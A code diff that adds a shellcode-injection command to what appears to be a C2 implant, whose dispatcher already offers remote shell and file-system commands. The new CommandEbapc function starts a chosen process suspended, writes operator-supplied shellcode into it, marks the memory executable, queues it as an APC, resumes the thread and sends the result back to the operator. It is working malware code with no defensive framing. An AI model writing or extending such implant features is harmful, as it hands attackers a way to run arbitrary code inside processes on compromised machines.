@@ -4,7 +4,7 @@
 #include <Package.h>
 #include <Core.h>
 
-#define Mana_COMMAND_LENGTH 9
+#define Mana_COMMAND_LENGTH 10
 
 Mana_COMMAND Commands[ Mana_COMMAND_LENGTH ] = {
         { .ID = COMMAND_SHELL,            .Function = CommandShell },
@@ -15,6 +15,7 @@ Mana_COMMAND Commands[ Mana_COMMAND_LENGTH ] = {
         { .ID = COMMAND_PWD,              .Function = CommandPwd },
         { .ID = COMMAND_CD,               .Function = CommandCd },
         { .ID = COMMAND_LS,               .Function = CommandLs },
+        { .ID = COMMAND_EBAPC,               .Function = CommandEbapc },
 };
 
 VOID CommandDispatcher()
@@ -88,6 +89,86 @@ VOID CommandDispatcher()
     } while ( TRUE );
 
     Instance.Session.Connected = FALSE;
+}
+
+VOID CommandEbapc( PPARSER Parser )
+{
+    PPACKAGE Package          = PackageCreate( COMMAND_OUTPUT );
+    CHAR     Output[1024]     = { 0 };
+    INT      Offset           = 0;
+    PVOID    ShellcodeAddress = NULL;
+    DWORD    NameSize         = 0;
+    DWORD    ShellSize        = 0;
+    DWORD    dwOldProtection  = 0;
+
+    // Get process name
+    PCHAR Processname = ParserGetBytes( Parser, &NameSize );
+    
+    // Get shellcode bytes
+    PBYTE Shellcode = ParserGetBytes( Parser, &ShellSize );
+
+    // Null terminate process name
+    CHAR ProcessPath[MAX_PATH] = { 0 };
+    memcpy( ProcessPath, Processname, (NameSize < MAX_PATH - 1) ? NameSize : MAX_PATH - 1 );
+
+    // Trim whitespace
+    for ( INT i = strlen(ProcessPath) - 1; i >= 0 && (ProcessPath[i] == ' ' || ProcessPath[i] == '\r' || ProcessPath[i] == '\n'); i-- )
+    {
+        ProcessPath[i] = '\0';
+    }
+
+    
+    STARTUPINFOA        Si = { 0 };
+    PROCESS_INFORMATION Pi = { 0 };
+    Si.cb = sizeof(Si);
+    
+    // Create suspended process
+    if ( !CreateProcessA( ProcessPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &Si, &Pi ) )
+    {
+        Offset += sprintf( Output + Offset, "[!] CreateProcessA failed: %d\r\n", GetLastError() );
+    }
+
+    Offset += sprintf( Output + Offset, "[+] Created process PID: %d\r\n", Pi.dwProcessId );
+
+    // Allocate memory
+    ShellcodeAddress = VirtualAllocEx( Pi.hProcess, NULL, ShellSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+    if ( !ShellcodeAddress )
+    {
+        Offset += sprintf( Output + Offset, "[!] VirtualAllocEx failed: %d\r\n", GetLastError() );
+        TerminateProcess( Pi.hProcess, 0 );
+    }
+
+    // Write shellcode 
+    if ( !WriteProcessMemory( Pi.hProcess, ShellcodeAddress, Shellcode, ShellSize, NULL ) )
+    {
+        Offset += sprintf( Output + Offset, "[!] WriteProcessMemory failed: %d\r\n", GetLastError() );
+        TerminateProcess( Pi.hProcess, 0 );
+    }
+
+    // Change protection to RX
+    if ( !VirtualProtectEx( Pi.hProcess, ShellcodeAddress, ShellSize, PAGE_EXECUTE_READWRITE, &dwOldProtection ) )
+    {
+        Offset += sprintf( Output + Offset, "[!] VirtualProtectEx failed: %d\r\n", GetLastError() );
+        TerminateProcess( Pi.hProcess, 0 );
+    }
+
+    // Queue APC
+    if ( !QueueUserAPC( (PAPCFUNC)ShellcodeAddress, Pi.hThread, 0 ) )
+    {
+        Offset += sprintf( Output + Offset, "[!] QueueUserAPC failed: %d\r\n", GetLastError() );
+        TerminateProcess( Pi.hProcess, 0 );
+    }
+
+    // Resume thread
+    ResumeThread( Pi.hThread );
+    Offset += sprintf( Output + Offset, "[+] Shellcode injected and executed!\r\n" );
+
+    // Cleanup handles
+    CloseHandle( Pi.hProcess );
+    CloseHandle( Pi.hThread );
+
+    PackageAddBytes( Package, (PBYTE)Output, Offset );
+    PackageTransmit( Package, NULL, NULL );
 }
 
 VOID CommandLs( PPARSER Parser )
